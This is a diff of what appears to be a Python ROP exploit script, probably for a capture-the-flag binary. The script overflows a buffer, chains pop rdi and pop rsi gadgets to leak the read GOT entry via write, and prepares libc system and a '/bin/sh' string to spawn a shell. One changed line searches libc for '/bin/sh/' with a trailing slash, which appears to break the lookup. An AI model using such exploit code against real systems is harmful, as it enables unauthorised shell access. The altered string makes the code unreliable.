@@ -20,7 +20,7 @@ main = e.symbols['main']
 
 read_offset = libc.symbols['read']
 system_offset = libc.symbols['system']
-sh = list(libc.search(b"/bin/sh"))[0]
+sh = list(libc.search(b"/bin/sh/"))[0]
 
 pop_rdi = r.find_gadget(["pop rdi", 'ret'])[0]
 pop_rsi_r15 = r.find_gadget(['pop rsi','pop r15', 'ret'])[0]
@@ -28,7 +28,7 @@ pop_rsi_r15 = r.find_gadget(['pop rsi','pop r15', 'ret'])[0]
 buf2sfp = 0x40
 payload = b'A' * (buf2sfp + 0x8)
 
-#wirte(1, read_got, 8)
+#write(1, read_got, 8)
 payload += p64(pop_rdi) + p64(1)
 payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
 payload += p64(write_plt)
